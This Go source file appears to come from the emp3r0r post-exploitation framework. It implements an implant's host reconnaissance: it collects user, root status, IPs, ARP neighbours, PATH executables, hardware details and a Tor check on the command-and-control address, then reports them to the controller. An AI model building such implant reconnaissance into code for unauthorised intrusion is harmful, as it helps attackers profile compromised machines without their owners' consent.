package agentutils

import (
	"fmt"
	"os"
	"os/user"
	"runtime"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jaypipes/ghw"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/sysinfo"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// GatherSystemDetails build system info object (minimal for startup)
func GatherSystemDetails() *def.Emp3r0rAgent {
	logging.Println("Collecting system info for reporting status")
	var info def.Emp3r0rAgent
	osinfo := sysinfo.GetOSInfo()
	info.GOOS = runtime.GOOS

	info.OS = fmt.Sprintf("%s %s %s (%s)", osinfo.Vendor, osinfo.Name, osinfo.Version, osinfo.Architecture)
	hostname, err := os.Hostname()
	if err != nil {
		logging.Printf("Gethostname: %v", err)
		hostname = "unknown_host"
	}
	// read productInfo
	// Minimal: skip ghw.Product
	info.Product = nil

	info.CWD, err = os.Getwd()
	if err != nil {
		logging.Printf("Getwd: %v", err)
		info.CWD = "."
	}

	common.RuntimeConfig.AgentTag = util.GetHostID(info.Product, common.RuntimeConfig.AgentUUID)
	info.Tag = common.RuntimeConfig.AgentTag // use hostid
	info.UUID = common.RuntimeConfig.AgentUUID
	info.UUIDSig = common.RuntimeConfig.AgentUUIDSig
	info.Hostname = hostname
	info.Name = strings.Split(info.Tag, "-agent")[0]
	info.Version = def.Version
	info.Kernel = osinfo.Kernel
	info.Arch = osinfo.Architecture
	// Minimal: skip hardware info
	info.CPU = "N/A"
	info.GPU = "N/A"
	info.Mem = "N/A"
	info.Hardware = "N/A"
	info.Container = "N/A" // sysinfo.CheckContainer() might be light, but skipping for minimal
	info.Transport = genC2TransportString()
	def.Transport = info.Transport

	// have root?
	info.HasRoot = sysinfo.HasRoot()

	// process
	info.Process = getAgentProcess()

	// user account info
	u, err := user.Current()
	if err != nil {
		logging.Println(err)
		info.User = "Not available"
	}
	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)

	// is cc on tor?
	info.HasTor = netutil.IsTor(def.CCAddress)

	// has internet?
	// Minimal: skip connectivity test
	info.HasInternet = false
	info.NCSIEnabled = false

	// IP address?
	info.IPs = netutil.IPa()

	// arp -a ?
	// Minimal: skip ARP
	info.ARP = []string{}

	// exes in PATH
	// Minimal: skip PATH scan
	info.Exes = []string{}

	return &info
}

// CollectFullSystemInfo build full system info object
func CollectFullSystemInfo() *def.Emp3r0rAgent {
	logging.Println("Collecting full system info")
	var info def.Emp3r0rAgent
	osinfo := sysinfo.GetOSInfo()
	info.GOOS = runtime.GOOS

	info.OS = fmt.Sprintf("%s %s %s (%s)", osinfo.Vendor, osinfo.Name, osinfo.Version, osinfo.Architecture)
	hostname, err := os.Hostname()
	if err != nil {
		logging.Printf("Gethostname: %v", err)
		hostname = "unknown_host"
	}
	// read productInfo
	info.Product, err = ghw.Product(ghw.WithDisableWarnings())
	if err != nil {
		logging.Printf("ProductInfo: %v", err)
	}
	info.CWD, err = os.Getwd()
	if err != nil {
		logging.Printf("Getwd: %v", err)
		info.CWD = "."
	}

	common.RuntimeConfig.AgentTag = util.GetHostID(info.Product, common.RuntimeConfig.AgentUUID)
	info.Tag = common.RuntimeConfig.AgentTag // use hostid
	info.UUID = common.RuntimeConfig.AgentUUID
	info.UUIDSig = common.RuntimeConfig.AgentUUIDSig
	info.Hostname = hostname
	info.Name = strings.Split(info.Tag, "-agent")[0]
	info.Version = def.Version
	info.Kernel = osinfo.Kernel
	info.Arch = osinfo.Architecture
	info.CPU = util.GetCPUInfo()
	info.GPU = util.GetGPUInfo()
	info.Mem = fmt.Sprintf("%d MB", util.GetMemSize())
	info.Hardware = util.CheckProduct(info.Product)
	info.Container = sysinfo.CheckContainer()
	info.Transport = genC2TransportString()
	def.Transport = info.Transport

	// have root?
	info.HasRoot = sysinfo.HasRoot()

	// process
	info.Process = getAgentProcess()

	// user account info
	u, err := user.Current()
	if err != nil {
		logging.Println(err)
		info.User = "Not available"
	}
	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)

	// is cc on tor?
	info.HasTor = netutil.IsTor(def.CCAddress)

	// has internet?
	if common.RuntimeConfig.EnableNCSI {
		info.HasInternet = transport.TestConnectivity(transport.UbuntuConnectivityURL, common.RuntimeConfig.C2TransportProxy)
		info.NCSIEnabled = true
	} else {
		info.HasInternet = false
		info.NCSIEnabled = false
	}

	// IP address?
	info.IPs = netutil.IPa()

	// arp -a ?
	info.ARP = netutil.IPNeigh()

	// exes in PATH
	info.Exes = util.ScanPATH()

	return &info
}
